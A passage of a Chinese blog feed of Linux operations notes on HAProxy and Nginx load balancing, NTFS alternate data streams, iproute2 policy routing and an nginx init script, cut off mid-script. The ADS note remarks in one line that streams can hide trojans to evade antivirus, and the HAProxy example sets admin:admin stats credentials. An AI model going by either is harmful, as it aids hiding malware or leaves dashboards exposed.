title="2.Haproxy的功能"></a>2.Haproxy的功能</h5><ul><li><p>负载均衡</p><p>基于L4和L7负载均衡,支持多种负载均衡算法</p></li><li><p>健康检查</p><p>支持TCP和HTTP两种健康检查模式</p></li><li><p>会话保持</p><p>对于未实现会话共享的应用集群，可通过Insert Cookie&#x2F;Rewrite Cookie&#x2F;Prefix Cookie，以及上述的多种Hash方式实现会话保持</p></li><li><p>监控与统计</p><p>HAProxy提供了基于Web的统计信息页面，展现健康状态和流量数据。基于此功能，使用者可以开发监控程序来监控HAProxy的状态</p></li></ul><h5 id="3-Haproxy配置"><a href="#3-Haproxy配置" class="headerlink" title="3.Haproxy配置"></a>3.Haproxy配置</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">global</span><br><span class="line"><span class="built_in">log</span> /dev/loglocal0</span><br><span class="line"><span class="built_in">log</span> /dev/loglocal1 notice</span><br><span class="line"><span class="built_in">chroot</span> /var/lib/haproxy</span><br><span class="line">stats socket /run/haproxy/admin.sock mode 660 level admin expose-fd listeners</span><br><span class="line">stats <span class="built_in">timeout</span> 30s</span><br><span class="line">user haproxy</span><br><span class="line">group haproxy</span><br><span class="line">daemon</span><br><span class="line"></span><br><span class="line"><span class="comment"># Default SSL material locations</span></span><br><span class="line">ca-base /etc/ssl/certs</span><br><span class="line">crt-base /etc/ssl/private</span><br><span class="line"></span><br><span class="line"><span class="comment"># See: https://ssl-config.mozilla.org/#server=haproxy&amp;server-version=2.0.3&amp;config=intermediate</span></span><br><span class="line">    ssl-default-bind-ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384</span><br><span class="line">    ssl-default-bind-ciphersuites TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256</span><br><span class="line">    ssl-default-bind-options ssl-min-ver TLSv1.2 no-tls-tickets</span><br><span class="line"></span><br><span class="line">defaults</span><br><span class="line"><span class="built_in">log</span>global</span><br><span class="line">modehttp</span><br><span class="line">optionhttplog</span><br><span class="line">optiondontlognull</span><br><span class="line">        <span class="built_in">timeout</span> connect 5000</span><br><span class="line">        <span class="built_in">timeout</span> client  50000</span><br><span class="line">        <span class="built_in">timeout</span> server  50000</span><br><span class="line">errorfile 400 /etc/haproxy/errors/400.http</span><br><span class="line">errorfile 403 /etc/haproxy/errors/403.http</span><br><span class="line">errorfile 408 /etc/haproxy/errors/408.http</span><br><span class="line">errorfile 500 /etc/haproxy/errors/500.http</span><br><span class="line">errorfile 502 /etc/haproxy/errors/502.http</span><br><span class="line">errorfile 503 /etc/haproxy/errors/503.http</span><br><span class="line">errorfile 504 /etc/haproxy/errors/504.http</span><br><span class="line">frontend app<span class="comment">#前端请求分发器</span></span><br><span class="line"><span class="built_in">bind</span> *:8080</span><br><span class="line">mode http</span><br><span class="line">default_backend servers</span><br><span class="line">backend servers<span class="comment">#后端真实服务器</span></span><br><span class="line">server 192.168.0.2 192.168.0.2:80 check maxconn 2000<span class="comment">#check可以在服务器宕机的时候不再将请求分发给宕机服务器</span></span><br><span class="line">server 192.168.0.2 192.168.0.2:81 check maxconn 2000</span><br><span class="line">listen admin_stats <span class="comment">#配置可视化面板</span></span><br><span class="line"><span class="built_in">bind</span> *:8081</span><br><span class="line">mode http</span><br><span class="line">option httplog</span><br><span class="line">stats refresh 4s</span><br><span class="line">stats uri /dashboard</span><br><span class="line">stats auth admin:admin</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>启动haproxy服务器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart haproxy</span><br></pre></td></tr></table></figure><h3 id="3-Nginx"><a href="#3-Nginx" class="headerlink" title="3.Nginx"></a>3.Nginx</h3><h5 id="1-什么是Nginx"><a href="#1-什么是Nginx" class="headerlink" title="1.什么是Nginx?"></a>1.什么是Nginx?</h5><p>Nginx是一个高性能的web服务器和反向代理服务器</p><h5 id="2-Nginx配置负载均衡"><a href="#2-Nginx配置负载均衡" class="headerlink" title="2.Nginx配置负载均衡"></a>2.Nginx配置负载均衡</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">upstream server &#123; </span><br><span class="line">      server 127.0.0.1:80; </span><br><span class="line">      server 127.0.0.1:81; </span><br><span class="line">&#125;<span class="comment">#配置上游服务器(默认调度算法为轮询)</span></span><br><span class="line">localtion /&#123;</span><br><span class="line"><span class="comment">#配置后端实际处理请求的服务器</span></span><br><span class="line">proxy_pass http://server;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考:</p><p><a href="https://zhuanlan.zhihu.com/p/359918708">https://zhuanlan.zhihu.com/p/359918708</a></p>]]></content>
      
      
      <categories>
          
          <category> linux运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ads文件</title>
      <link href="/2022/08/13/ads%E6%96%87%E4%BB%B6/"/>
      <url>/2022/08/13/ads%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="ads文件"><a href="#ads文件" class="headerlink" title="ads文件"></a>ads文件</h1><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念:"></a>基本概念:</h3><p>NTFS交换数据流（Alternate Data Streams，简称ADS）是NTFS磁盘格式的一个特性。在<a href="https://baike.baidu.com/item/NTFS%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/2152677">NTFS文件系统</a>下，每个文件都可以存在多个数据流，意思是除了主文件流之外还可以有许多非主文件流寄宿在主文件流中，这些利用NTFS数据流寄宿并隐藏在系统中的非主文件流我们称之为ADS流文件。虽然我们无法看到ADS流文件，但它们却是真实存在。下面通过一个实例来具体展现ADS流文件的创建、关联及隐藏过程。</p><h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h3><p>在ntfs文件系统分区创建ads文件流有两种方式,一个是指在指定宿主文件的情况下创建ads文件流,二是创建一个单独的ads文件流,ads文件不能直接查看到,可以使用dir &#x2F;r命令查看,后缀带有$DATA的文件就是ads文件,ads文件不能直接使用type进行查看,可以使用notepad进行打开编辑</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> hello &gt; hello.txt:ads.txt <span class="comment">#以文件ads.txt为宿主文件,创建了ads文件ads.txt</span></span><br><span class="line"><span class="built_in">echo</span> hello &gt; :ads.txt <span class="comment">#创建一个没有宿主文件的单独ads文件(依赖于所在目录),(如果该文件在根分区目录下,只能借助第三方工具将其删除)</span></span><br></pre></td></tr></table></figure><p>可以通过使用ads文件隐藏木马,起到免杀的作用</p><h3 id="移除ads文件的方法"><a href="#移除ads文件的方法" class="headerlink" title="移除ads文件的方法"></a>移除ads文件的方法</h3><p>1.删除顶层目录</p><p>2.删除宿主文件</p><p>3.将文件移动到非ntfs分区</p><p>4.借助第三方软件将ads文件删除</p>]]></content>
      
      
      
        <tags>
            
            <tag> 计算机基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iproute2的基本使用</title>
      <link href="/2022/08/11/iproute2%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
      <url>/2022/08/11/iproute2%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="iproute2的基本使用"><a href="#iproute2的基本使用" class="headerlink" title="iproute2的基本使用"></a>iproute2的基本使用</h1><h3 id="1-常用命令"><a href="#1-常用命令" class="headerlink" title="1.常用命令"></a>1.常用命令</h3><h4 id="1-查看指定网卡的信息"><a href="#1-查看指定网卡的信息" class="headerlink" title="1.查看指定网卡的信息"></a>1.查看指定网卡的信息</h4><p>配置链路信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ip <span class="built_in">link</span> show eth0 <span class="comment">#查看网卡的链路信息</span></span><br><span class="line">ip <span class="built_in">link</span> <span class="built_in">set</span> eth0 up/down <span class="comment">#设置网卡启动或者关闭</span></span><br><span class="line">ip <span class="built_in">link</span> <span class="built_in">set</span> eth1 multicast on/off<span class="comment">#打开/关闭网络接口的多播标志</span></span><br><span class="line">ip <span class="built_in">link</span> <span class="built_in">set</span> eth1 mtu 1500<span class="comment">#设置mtu值</span></span><br><span class="line">ip <span class="built_in">link</span> <span class="built_in">set</span> eth1 txqueuelen 1000</span><br><span class="line">ip <span class="built_in">link</span> <span class="built_in">set</span> eth1 name eth10<span class="comment">#修改网卡标志</span></span><br><span class="line">ip <span class="built_in">link</span> <span class="built_in">set</span> eth1 arp on<span class="comment">#修改关联的arp标志</span></span><br></pre></td></tr></table></figure><p>配置ip地址信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ip addr show eth0 <span class="comment">#查看网卡的ip地址</span></span><br><span class="line">ip addr add/del/change ipaddress/netprefix dev interface <span class="comment">#添加/删除/修改 网卡的ip地址</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>配置路由信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip route add ipaddr/netmask via ipaddr dev eth0<span class="comment">#配置路由</span></span><br></pre></td></tr></table></figure><p>配置网卡子接口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip addr add IPADDRESS/PREFIX dev eth0 lable eth0:1 <span class="comment">#配置网卡子接口常用于单臂路由</span></span><br></pre></td></tr></table></figure><p>配置策略路由</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 配置默认路由</span></span><br><span class="line">ip route add default via 192.168.0.1</span><br><span class="line"><span class="comment"># 添加新路由表 out3</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;3 out3&quot;</span> &gt;&gt; /etc/iproute2/rt_tables</span><br><span class="line"><span class="comment"># 给 out3 路由表添加默认路由</span></span><br><span class="line">ip route add default via 192.168.0.3 table out3</span><br><span class="line"><span class="comment"># 用 iptables 给访问 tcp 80 端口的数据打标</span></span><br><span class="line">iptables -t mangle -A OUTPUT -p tcp --dport 80 -j MARK --set-mark 3</span><br><span class="line"><span class="comment"># 将打标数据与 out3 路由表关联</span></span><br><span class="line">ip rule add fwmark 3 table out3  </span><br></pre></td></tr></table></figure><p>系统默认有三个路由表</p><p>Linux最多可以支持255张路由表，其中有3张表是内置的：<br>　　表255 本地路由表（Local table） 本地接口地址，广播地址，已及NAT地址都放在这个表。该路由表由系统自动维护，管理员不能直接修改。<br>　　表254 主路由表（Main table） 如果没有指明路由所属的表，所有的路由都默认都放在这个表里，一般来说，旧的路由工具（如route）所添加的路由都会加到这个表。一般是普通的路由。</p><p>​表253 默认路由表 （Default table） 一般来说默认的路由都放在这张表，但是如果特别指明放的也可以是所有的网关路由。</p><p>查看路由规则内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip route list table table_number</span><br></pre></td></tr></table></figure><p>添加规则</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip route add from ipaddress/netprefix  table table_num pref <span class="comment">#匹配该ip地址段的流量按路由表table_num处理</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux基本工具的使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux常用的服务启动工具的原理</title>
      <link href="/2022/08/05/linux%E5%B8%B8%E7%94%A8%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%90%AF%E5%8A%A8%E5%B7%A5%E5%85%B7%E7%9A%84%E5%8E%9F%E7%90%86/"/>
      <url>/2022/08/05/linux%E5%B8%B8%E7%94%A8%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%90%AF%E5%8A%A8%E5%B7%A5%E5%85%B7%E7%9A%84%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="linux常用的服务工具的原理"><a href="#linux常用的服务工具的原理" class="headerlink" title="linux常用的服务工具的原理"></a>linux常用的服务工具的原理</h1><h3 id="1-openrc-systemd"><a href="#1-openrc-systemd" class="headerlink" title="1.openrc&#x2F;systemd"></a>1.openrc&#x2F;systemd</h3><p>通过读取&#x2F;etc&#x2F;init.d&#x2F;*脚本,这个脚本定义了程序的执行规则,停止规则等.</p><p>以nginx服务的服务脚本为例</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">## BEGIN INIT INFO</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Provides:  nginx</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Required-Start:    <span class="variable">$local_fs</span> <span class="variable">$remote_fs</span> <span class="variable">$network</span> <span class="variable">$syslog</span> <span class="variable">$named</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Required-Stop:     <span class="variable">$local_fs</span> <span class="variable">$remote_fs</span> <span class="variable">$network</span> <span class="variable">$syslog</span> <span class="variable">$named</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Default-Start:     2 3 4 5</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Default-Stop:      0 1 6</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Short-Description: starts the nginx web server</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Description:       starts nginx using start-stop-daemon</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">## END INIT INFO</span></span></span><br><span class="line"></span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line">DAEMON=/usr/sbin/nginx</span><br><span class="line">NAME=nginx</span><br><span class="line">DESC=nginx</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Include nginx defaults <span class="keyword">if</span> available</span></span><br><span class="line">if [ -r /etc/default/nginx ]; then</span><br><span class="line">. /etc/default/nginx</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">STOP_SCHEDULE=&quot;$&#123;STOP_SCHEDULE:-QUIT/5/TERM/5/KILL/5&#125;&quot;</span><br><span class="line"></span><br><span class="line">test -x $DAEMON || exit 0</span><br><span class="line"></span><br><span class="line">. /lib/init/vars.sh</span><br><span class="line">. /lib/lsb/init-functions</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Try to extract nginx pidfile</span></span><br><span class="line">PID=$(cat /etc/nginx/nginx.conf | grep -Ev &#x27;^\s*#&#x27; | awk &#x27;BEGIN &#123; RS=&quot;[;&#123;&#125;]&quot; &#125; &#123; if ($1 == &quot;pid&quot;) print $2 &#125;&#x27; | head -n1)</span><br><span class="line">if [ -z &quot;$PID&quot; ]; then</span><br><span class="line">PID=/run/nginx.pid</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">if [ -n &quot;$ULIMIT&quot; ]; then</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Set <span class="built_in">ulimit</span> <span class="keyword">if</span> it is <span class="built_in">set</span> <span class="keyword">in</span> /etc/default/nginx</span></span><br><span class="line">ulimit $ULIMIT</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">start_nginx() &#123;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Start the daemon/service</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Returns:</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  0 <span class="keyword">if</span> daemon has been started</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  1 <span class="keyword">if</span> daemon was already running</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  2 <span class="keyword">if</span> daemon could not be started</span></span><br><span class="line">start-stop-daemon --start --quiet --pidfile $PID --exec $DAEMON --test &gt; /dev/null \</span><br><span class="line">|| return 1</span><br><span class="line">start-stop-daemon --start --quiet --pidfile $PID --exec $DAEMON -- \</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">DAEMON_OPTS 2&gt;/dev/null \</span></span><br><span class="line"><span class="language-bash">|| <span class="built_in">return</span> 2</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">test_config() &#123;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Test the nginx configuration</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">DAEMON -t <span class="variable">$DAEMON_OPTS</span> &gt;/dev/null 2&gt;&amp;1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stop_nginx() &#123;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Stops the daemon/service</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Return</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  0 <span class="keyword">if</span> daemon has been stopped</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  1 <span class="keyword">if</span> daemon was already stopped</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  2 <span class="keyword">if</span> daemon could not be stopped</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  other <span class="keyword">if</span> a failure occurred</span></span><br><span class="line">start-stop-daemon --stop --quiet --retry=$STOP_SCHEDULE --pidfile $PID --name $NAME</span><br><span class="line">RETVAL=&quot;$?&quot;</span><br><span class="line">sleep 1</span><br><span class="line">return &quot;$RETVAL&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">reload_nginx() &#123;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Function that sends a SIGHUP to the daemon/service</span></span><br><span class="line">start-stop-daemon --stop --signal HUP --quiet --pidfile $PID --name $NAME</span><br><span class="line">return 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rotate_logs() &#123;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Rotate <span class="built_in">log</span> files</span></span><br><span class="line">start-stop-daemon --stop --signal USR1 --quiet --pidfile $PID --name $NAME</span><br><span class="line">return 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">upgrade_nginx() &#123;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Online upgrade nginx executable</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">http://nginx.org/en/docs/control.html</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Return</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  0 <span class="keyword">if</span> nginx has been successfully upgraded</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  1 <span class="keyword">if</span> nginx is not running</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  2 <span class="keyword">if</span> the pid files were not created on time</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  3 <span class="keyword">if</span> the old master could not be killed</span></span><br><span class="line">if start-stop-daemon --stop --signal USR2 --quiet --pidfile $PID --name $NAME; then</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Wait <span class="keyword">for</span> both old and new master to write their pid file</span></span><br><span class="line">while [ ! -s &quot;$&#123;PID&#125;.oldbin&quot; ] || [ ! -s &quot;$&#123;PID&#125;&quot; ]; do</span><br><span class="line">cnt=`expr $cnt + 1`</span><br><span class="line">if [ $cnt -gt 10 ]; then</span><br><span class="line">return 2</span><br><span class="line">fi</span><br><span class="line">sleep 1</span><br><span class="line">done</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Everything is ready, gracefully stop the old master</span></span><br><span class="line">if start-stop-daemon --stop --signal QUIT --quiet --pidfile &quot;$&#123;PID&#125;.oldbin&quot; --name $NAME; then</span><br><span class="line">return 0</span><br><span class="line">else</span><br><span class="line">return 3</span><br><span class="line">fi</span><br><span class="line">else</span><br><span class="line">return 1</span><br><span class="line">fi</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">case &quot;$1&quot; in</span><br><span class="line">start)</span><br><span class="line">log_daemon_msg &quot;Starting $DESC&quot; &quot;$NAME&quot;</span><br><span class="line">start_nginx</span><br><span class="line">case &quot;$?&quot; in</span><br><span class="line">0|1) log_end_msg 0 ;;</span><br><span class="line">2)   log_end_msg 1 ;;</span><br><span class="line">esac</span><br><span class="line">;;</span><br><span class="line">stop)</span><br><span class="line">log_daemon_msg &quot;Stopping $DESC&quot; &quot;$NAME&quot;</span><br><span class="line">stop_nginx</span><br><span class="line">case &quot;$?&quot; in</span><br><span class="line">0|1) log_end_msg 0 ;;</span><br><span class="line">2)   log_end_msg 1 ;;</span><br><span class="line">esac</span><br><span class="line">;;</span><br><span class="line">restart)</span><br><span class="line">log_daemon_msg &quot;Restarting $DESC&quot; &quot;$NAME&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Check configuration before stopping nginx</span></span><br><span class="line">if ! test_config; then</span><br><span class="line">log_end_msg 1 # Configuration error</span><br><span class="line">exit $?</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">stop_nginx</span><br><span class="line">case &quot;$?&quot; in</span><br><span class="line">0|1)</span><br><span class="line">start_nginx</span><br><span class="line">case &quot;$?&quot; in</span><br><span class="line">0) log_end_msg 0 ;;</span><br><span class="line">1) log_end_msg 1 ;; # Old process is still running</span><br><span class="line">*) log_end_msg 1 ;; # Failed to start</span><br><span class="line">esac</span><br><span class="line">;;</span><br><span class="line">*)</span><br><span class="line"># Failed to stop</span><br><span class="line">log_end_msg 1</span><br><span class="line">;;</span><br><span class="line">esac</span><br><span class="line">;;</span><br><span class="line">reload|force-reload)</span><br><span class="line">log_daemon_msg &quot;Reloading $DESC configuration&quot; &quot;$NAME&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Check configuration before stopping nginx</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># This is not entirely correct since the on-disk nginx binary</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">may differ from the in-memory one, but that<span class="string">&#x27;s not common.</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">We prefer to check the configuration and return an error</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">to the administrator.</span></span></span><br><span class="line">if ! test_config; then</span><br><span class="line">log_end_msg 1 # Configuration error</span><br><span class="line">exit $?</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">reload_nginx</span><br><span class="line">log_end_msg $?</span><br><span 